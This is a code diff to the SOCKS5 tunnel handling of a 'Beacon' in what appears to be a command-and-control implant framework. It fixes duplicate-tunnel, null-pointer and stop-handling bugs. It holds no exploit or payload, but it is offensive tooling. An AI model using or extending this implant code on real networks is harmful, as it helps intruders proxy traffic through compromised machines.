@@ -801,13 +801,20 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
     }
     else if (c2Message.cmd() == StopSocksCmd)
     {
-        for (int i = 0; i < m_socksTunnelClient.size(); i++)
-            m_socksTunnelClient[i].reset(nullptr);
+        m_socksTunnelClient.clear();
         return false;
     }
     else if (c2Message.cmd() == InitCmd)
     {
         SPDLOG_DEBUG("Socks5 init {}: {}:{}", c2Message.pid(), c2Message.data(), c2Message.args());
+        auto existing = std::find_if(
+            m_socksTunnelClient.begin(), m_socksTunnelClient.end(),
+            [&](const auto& tunnel) {
+                return tunnel && tunnel->getId() == c2Message.pid();
+            });
+        if (existing != m_socksTunnelClient.end())
+            return false;
+
         std::unique_ptr<SocksTunnelClient> socksTunnelClient = std::make_unique<SocksTunnelClient>(c2Message.pid());
         try
         {
@@ -848,9 +855,9 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
         SPDLOG_DEBUG("Socks5 run {}", c2Message.pid());
         for (int i = 0; i < m_socksTunnelClient.size(); i++)
         {
-            SPDLOG_DEBUG("Socks5 run id with handle {}, id available {}", c2Message.pid(), m_socksTunnelClient[i]->getId());
             if (m_socksTunnelClient[i] != nullptr)
             {
+                SPDLOG_DEBUG("Socks5 run id with handle {}, id available {}", c2Message.pid(), m_socksTunnelClient[i]->getId());
                 if (m_socksTunnelClient[i]->getId() == c2Message.pid())
                 {
                     SPDLOG_DEBUG("Socks5 run process {}", c2Message.pid());
@@ -867,9 +874,15 @@ bool Beacon::handleSocks5Instruction(C2Message& c2Message, C2Message& c2RetMessa
                     }
                     SPDLOG_DEBUG("Socks5 run process finished {}", c2Message.pid());
                     c2RetMessage.set_data(dataOut);
+                    break;
                 }
             }
         }
+        if (std::none_of(m_socksTunnelClient.begin(), m_socksTunnelClient.end(),
+                         [&](const auto& tunnel) {
+                             return tunnel && tunnel->getId() == c2Message.pid();
+                         }) && c2RetMessage.cmd() == RunCmd)
+            c2RetMessage.set_cmd(StopCmd);
         SPDLOG_DEBUG("Socks5 run Finished");
     }
     else if (c2Message.cmd() == StopCmd)
